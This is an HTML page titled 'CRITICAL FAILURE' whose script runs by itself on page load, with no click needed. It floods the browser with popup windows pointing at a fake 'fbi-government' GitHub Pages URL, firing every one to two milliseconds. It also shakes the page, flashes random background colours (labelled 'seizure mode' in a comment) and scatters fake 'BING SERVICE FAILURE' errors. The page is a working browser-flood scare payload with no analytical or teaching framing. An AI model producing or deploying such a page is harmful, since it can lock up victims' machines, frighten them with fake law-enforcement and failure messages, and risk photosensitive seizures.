<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>CRITICAL FAILURE</title>
<style>
html, body {
    margin: 0;
    width: 100%;
    height: 100%;
    background: black;
    color: red;
    overflow: hidden;
    font-family: Arial, sans-serif;
}

h1 {
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    animation: flash 0.05s infinite;
}

@keyframes flash {
    0% { color: red; }
    50% { color: white; }
    100% { color: red; }
}
</style>
</head>
<body>

<h1>RECOVERING SYSTEM…</h1>

<script>
let x = 0;
let y = 0;
let dx = 120;
let dy = 90;

const BASE_URL = "https://fbi-government.github.io/die/";
const sw = screen.width;
const sh = screen.height;

function rand(min, max) {
    return Math.random() * (max - min) + min;
}

// AUTO START — NO CLICK
setTimeout(() => {

    // EXTREME WINDOW FLOOD (10x faster)
    setInterval(() => {
        for (let i = 0; i < 25; i++) {
            window.open(
                BASE_URL,
                "_blank",
                `width=${rand(150,500)},
                 height=${rand(120,400)},
                 left=${x},
                 top=${y}`
            );

            x += dx;
            y += dy;

            if (x > sw || x < 0) dx *= -1;
            if (y > sh || y < 0) dy *= -1;
        }
    }, 1); // 1ms = insane speed

    // RANDOM FULL-SCREEN BING ATTACK
    setInterval(() => {
        window.open(
            BASE_URL,
            "_blank",
            `width=${rand(300,800)},
             height=${rand(300,800)},
             left=${rand(0, sw)},
             top=${rand(0, sh)}`
        );
    }, 2);

    // SCREEN SHAKE
    setInterval(() => {
        document.body.style.transform =
            `translate(${rand(-30,30)}px, ${rand(-30,30)}px)`;
    }, 15);

    // BACKGROUND SEIZURE MODE
    setInterval(() => {
        document.body.style.background =
            `rgb(${rand(0,255)},${rand(0,255)},${rand(0,255)})`;
    }, 25);

    // ERROR TEXT STORM
    setInterval(() => {
        const e = document.createElement("div");
        e.textContent = "BING SERVICE FAILURE";
        e.style.position = "absolute";
        e.style.left = rand(0, innerWidth) + "px";
        e.style.top = rand(0, innerHeight) + "px";
        e.style.fontSize = rand(14, 32) + "px";
        document.body.appendChild(e);

        if (document.body.children.length > 600)
            document.body.removeChild(document.body.children[0]);
    }, 4);

}, 50); // tiny delay to ensure auto-run
</script>

</body>
</html>
